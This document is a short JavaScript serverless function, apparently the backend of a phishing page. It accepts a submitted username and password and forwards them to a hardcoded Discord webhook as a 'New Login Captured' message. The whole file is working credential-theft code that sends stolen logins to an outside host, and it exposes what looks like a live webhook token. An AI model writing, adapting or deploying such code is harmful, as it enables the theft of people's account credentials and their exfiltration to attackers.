module.exports = async (req, res) => {
  const discordWebhookUrl = "https://discord.com/api/webhooks/1408935972829401158/TMRXIF8bqJ7YzjXDGKGYi_4DeXgtPtI2JcJR_ecLP9FFyYq-fCC-u24tYVPQGnyx5Q8w";
  
  try {
    const { username, password, timestamp } = req.body;
    if (!username || !password || !timestamp) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    const response = await fetch(discordWebhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [{
          title: "New Login Captured",
          fields: [
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Timestamp", value: timestamp, inline: false }
          ],
          color: 0x00b0ff
        }]
      })
    });

    if (!response.ok) {
      throw new Error("Discord webhook request failed");
    }

    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ error: "Server error" });
  }
};
